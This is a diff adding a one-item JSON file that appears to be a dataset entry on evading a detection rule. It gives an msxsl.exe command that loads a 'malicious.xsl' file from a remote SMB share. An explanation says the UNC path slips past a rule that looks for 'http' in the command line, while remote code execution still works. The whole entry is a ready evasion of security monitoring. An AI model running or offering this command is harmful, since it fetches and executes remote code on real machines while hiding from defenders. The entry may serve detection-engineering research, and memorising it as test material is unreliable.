@@ -1,0 +1,6 @@
+[
+  {
+    "output": "msxsl.exe local.xml \\\\10.0.0.5\\share\\malicious.xsl",
+    "explanation": "The rule specifically looks for the string 'http' in the command line to detect remote XSL fetching. By using a UNC path (SMB) to fetch the XSL file from a remote server instead of HTTP/HTTPS, the 'CommandLine|contains' condition is not met, but the remote execution functionality remains."
+  }
+]
